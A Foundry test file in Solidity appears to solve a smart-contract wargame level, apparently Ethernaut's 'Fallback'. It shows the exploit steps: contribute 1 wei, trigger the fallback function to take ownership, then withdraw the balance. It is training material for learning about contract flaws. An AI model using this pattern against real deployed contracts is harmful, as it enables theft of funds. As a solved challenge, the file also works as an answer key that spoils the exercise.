// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "tests/Test.sol";
import "../../src/Fallback/Level.sol";
import "forge-std/console.sol";

interface IFallback {
    function owner() external view returns(address);

    function contributions(address) external view returns(uint256);

    function contribute() external payable;

    function withdraw() external;
}

contract FallbackTest is Test {
    IFallback fallbhack;

    address deployer = address(100);
    address attacker = address(101);

    function setUp() public {
        vm.prank(deployer); // deploy the contract as deployer
        fallbhack = IFallback(address(new Fallback()));
        uint256 contrib = fallbhack.contributions(deployer);
        deal(address(fallbhack), contrib);
    }

    function testAttack() public {
        /* Setup stuff, no need to touch */
        uint256 balBefore = address(fallbhack).balance;
        vm.startPrank(attacker);
        vm.deal(attacker, 5 ether);

        /* Write your code here */  
        fallbhack.contribute.value(1 wei)(); // Just add a contribution
        payable(address(fallbhack)).call.value(1 wei)(""); // Claim ownership
        fallbhack.withdraw(); // Withdraw funds
        /* Write your code here */ 

        /* Validating the test */
        assertEq(fallbhack.owner(), attacker);
        assertEq(address(fallbhack).balance, 0);
    }
}
